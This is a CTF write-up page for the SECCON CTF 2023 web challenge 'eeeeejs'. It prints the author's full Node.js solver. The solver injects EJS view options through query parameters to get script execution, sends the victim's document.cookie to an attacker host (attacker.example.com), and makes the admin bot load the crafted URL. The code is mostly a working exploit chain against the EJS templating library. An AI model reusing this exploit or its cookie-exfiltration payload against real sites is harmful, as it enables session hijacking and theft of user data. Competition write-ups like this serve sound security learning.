---
title: "Eeeeejs - SECCON CTF 2023 Quals"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "eeeeejs", "web", "seccon-ctf-2023-quals"]
summary: "Can you bypass all mitigations?"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/web/eeeeejs"
license: "none stated"
ctf:
  name: "SECCON CTF 2023 Quals"
  year: 2023
  challenge: "Eeeeejs"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/web/eeeeejs>
- **CTF:** SECCON CTF 2023 Quals

---

# [web] eeeeejs

## Description

Can you bypass all mitigations?

- Challenge: `http://eeeeejs.seccon.games:3000`
- Admin bot: `http://eeeeejs.seccon.games:1337`

## Attachments

- [eeeeejs](files/eeeeejs)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e ATTACKER_BASE_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```

where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/web/eeeeejs/solver/index.js>

```javascript
const fastify = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? fail("No BOT_BASE_URL");
const ATTACKER_BASE_URL =
  process.env.ATTACKER_BASE_URL ?? fail("No ATTACKER_BASE_URL");
const PORT = "8080";

const sleep = (msecs) => new Promise((resolve) => setTimeout(resolve, msecs));

const jsPayload = `location = "${ATTACKER_BASE_URL}?" + document.cookie`;

const srcUrl = `/?${new URLSearchParams({
  filename: "render.dist.js",
  "settings[view options][openDelimiter]": "__require() {\n",
  "settings[view options][closeDelimiter]": "||",
  "settings[view options][delimiter][]": "",
  mod: jsPayload,
})}`;

const evilUrl = `http://web:3000?${new URLSearchParams({
  "filename[href]": "x",
  "filename[origin]": "x",
  "filename[protocol]": "file:",
  "filename[hostname]": "",
  "filename[pathname]": "index.ejs",
  [`filename[<script src=${srcUrl}></script>]`]: "",
  "settings[view options][debug]": "1",
})}`;

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const start = async () => {
  fastify.get("/", async (req, reply) => {
    // You got a flag!
    console.log(req.query.FLAG);
    process.exit(0);
  });

  fastify.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) fail(err.toString());

    await sleep(3 * 1000);
    await reportUrl(evilUrl);

    fail("Failed");
  });
};
start();
```
